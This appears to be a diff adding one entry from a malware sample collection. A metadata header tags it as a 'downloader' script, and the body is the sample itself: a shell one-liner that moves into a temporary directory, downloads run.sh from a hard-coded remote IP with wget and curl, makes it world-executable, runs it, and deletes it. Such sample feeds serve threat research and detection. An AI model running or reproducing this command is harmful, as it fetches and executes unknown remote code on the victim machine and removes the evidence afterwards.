@@ -1,0 +1,10 @@
+# sha256: 9c7c17a6dcfc578ad86a76dec27db93dc3cca22d39226b3187be1e8f2edd0d52
+# family: downloader
+# kind: script
+# size_bytes: 170
+# first_seen: 2026-07-15 00:23:59.390059 UTC
+# times_seen: 1
+# yara_matches: none
+# ------------------------------------------------------------
+
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://41.216.189.157/run.sh; curl -O http://41.216.189.157/run.sh; chmod 777 run.sh; sh run.sh; rm -rf run.sh
